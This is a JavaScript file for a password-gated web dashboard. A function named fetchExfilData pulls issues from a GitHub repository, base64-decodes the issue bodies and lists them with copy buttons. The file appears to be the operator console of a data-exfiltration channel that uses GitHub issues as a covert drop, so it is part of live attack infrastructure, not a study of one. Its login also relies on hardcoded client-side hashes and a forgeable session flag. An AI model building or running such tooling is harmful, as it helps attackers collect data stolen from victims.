(function() {
    'use strict';

    const HASH_USER = 'b0d2a7c7d3d6f4a8c9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2';
    const HASH_PASS = 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2';

    async function hashString(str) {
        const encoder = new TextEncoder();
        const data = encoder.encode(str);
        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }

    const loginPage = document.getElementById('loginPage');
    const dashboardPage = document.getElementById('dashboardPage');
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginError = document.getElementById('loginError');
    const logContainer = document.getElementById('logContainer');
    const refreshBtn = document.getElementById('refreshBtn');
    const logoutBtn = document.getElementById('logoutBtn');
    const SESSION_KEY = '0xB0_auth';

    function isLoggedIn() {
        return sessionStorage.getItem(SESSION_KEY) === 'true';
    }

    function setLoggedIn(state) {
        sessionStorage.setItem(SESSION_KEY, state ? 'true' : 'false');
    }

    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const user = usernameInput.value.trim();
        const pass = passwordInput.value.trim();

        const hashUser = await hashString(user);
        const hashPass = await hashString(pass);

        if (hashUser === HASH_USER && hashPass === HASH_PASS) {
            setLoggedIn(true);
            loginError.textContent = '';
            showDashboard();
        } else {
            loginError.textContent = 'ACCESS DENIED';
            usernameInput.value = '';
            passwordInput.value = '';
            usernameInput.focus();
        }
    });

    function showDashboard() {
        loginPage.style.display = 'none';
        dashboardPage.style.display = 'block';
        fetchExfilData();
        if (window._refreshInterval) clearInterval(window._refreshInterval);
        window._refreshInterval = setInterval(fetchExfilData, 30000);
    }

    function showLogin() {
        loginPage.style.display = 'block';
        dashboardPage.style.display = 'none';
        if (window._refreshInterval) {
            clearInterval(window._refreshInterval);
            window._refreshInterval = null;
        }
        usernameInput.value = '';
        passwordInput.value = '';
        loginError.textContent = '';
    }

    logoutBtn.addEventListener('click', function() {
        setLoggedIn(false);
        showLogin();
    });

    const REPO = 'va1uxxx/0xB0';
    const API_URL = `https://api.github.com/repos/${REPO}/issues`;

    async function fetchExfilData() {
        const placeholder = `<div class="placeholder"><i class="fas fa-spinner spinner"></i> FETCHING DATA...</div>`;
        logContainer.innerHTML = placeholder;
        try {
            const response = await fetch(API_URL, {
                headers: { 'Accept': 'application/vnd.github.v3+json' }
            });
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            const issues = await response.json();
            if (!Array.isArray(issues) || issues.length === 0) {
                logContainer.innerHTML = `<div class="placeholder"><i class="fas fa-inbox"></i> NO DATA RECEIVED</div>`;
                return;
            }
            const sorted = issues.slice().reverse();
            let html = '';
            sorted.forEach(issue => {
                const title = escapeHtml(issue.title || 'Untitled');
                const time = new Date(issue.created_at).toLocaleString();
                let body = issue.body || '';
                let decoded = '';
                let isTruncated = false;
                try {
                    decoded = atob(body);
                } catch {
                    decoded = body;
                }
                if (decoded.length > 2500) {
                    isTruncated = true;
                    decoded = decoded.substring(0, 2500);
                }
                const displayBody = escapeHtml(decoded);
                const truncatedMark = isTruncated ? ' <span style="color:#4a5a6a;">… (truncated)</span>' : '';
                html += `
                    <div class="entry">
                        <div class="entry-header">
                            <span class="entry-title"><i class="fas fa-file-alt" style="color:#4a5a6a;margin-right:8px;"></i>${title}</span>
                            <span class="entry-time"><i class="far fa-clock"></i> ${time}</span>
                        </div>
                        <div class="entry-body">
                            ${displayBody}${truncatedMark}
                        </div>
                        <div style="text-align:right;margin-top:6px;">
                            <button class="copy-btn" data-copy="${escapeHtml(decoded)}"><i class="fas fa-copy"></i> COPY</button>
                        </div>
                    </div>
                `;
            });
            logContainer.innerHTML = html;
            document.querySelectorAll('.copy-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    const text = this.getAttribute('data-copy');
                    navigator.clipboard.writeText(text).then(() => {
                        const original = this.innerHTML;
                        this.innerHTML = '<i class="fas fa-check"></i> COPIED';
                        setTimeout(() => { this.innerHTML = original; }, 1500);
                    }).catch(() => {});
                });
            });
        } catch (err) {
            logContainer.innerHTML = `<div class="error-msg"><i class="fas fa-triangle-exclamation"></i> ERROR: ${escapeHtml(err.message)}</div>`;
        }
    }

    function escapeHtml(str) {
        if (!str) return '';
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return str.replace(/[&<>"']/g, function(m) { return map[m]; });
    }

    refreshBtn.addEventListener('click', function() {
        this.innerHTML = '<i class="fas fa-spinner spinner"></i>';
        fetchExfilData().finally(() => {
            this.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
        });
    });

    if (isLoggedIn()) {
        showDashboard();
    } else {
        showLogin();
    }

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && isLoggedIn()) {
            setLoggedIn(false);
            showLogin();
        }
    });
})();
